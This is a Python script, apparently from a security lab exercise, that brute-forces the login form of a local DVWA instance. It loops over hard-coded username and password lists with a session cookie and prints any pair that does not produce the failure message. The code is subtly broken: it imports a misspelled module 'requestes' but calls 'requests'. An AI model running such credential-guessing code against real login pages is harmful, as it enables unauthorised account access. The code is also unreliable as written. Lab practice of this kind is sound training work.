import time
import itertools
import requestes

# --- Configuración ---
BASE_URL = "http://127.0.0.1:4280/vulnerabilities/brute/"
COOKIES = {
    "PHPSESSID": "3g686d0gehddd1l0bivevenms0",  # Reemplazar por tu cookie de sesión activa
    "security": "low"
}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (BruteForceScript-Python/1.0)"  # Identificador único del script
}

# Mismas listas usadas en Burp Suite y Hydra
usernames = ["admin", "gordonb", "1337", "pablo", "smithy"]
passwords = ["password", "abc", "charley", "letmein", "admin", "123456"]

FAIL_MESSAGE = "Username and/or password incorrect."

def brute_force():
    valid_pairs = []
    start_time = time.time()
    intentos = 0

    for user, pwd in itertools.product(usernames, passwords):
        intentos += 1
        params = {
            "username": user,
            "password": pwd,
            "Login": "Login"
        }

        response = requests.get(BASE_URL, params=params, cookies=COOKIES, headers=HEADERS)

        if FAIL_MESSAGE not in response.text:
            print(f"[+] Credenciales válidas encontradas -> Usuario: {user} | Contraseña: {pwd}")
            valid_pairs.append((user, pwd))
        else:
            print(f"[-] Intento fallido -> Usuario: {user} | Contraseña: {pwd}")

    elapsed = time.time() - start_time
    print(f"\nTotal de intentos: {intentos}")
    print(f"Tiempo total: {elapsed:.2f} segundos")
    print(f"Pares válidos encontrados: {valid_pairs}")

    return valid_pairs

if __name__ == "__main__":
    brute_force()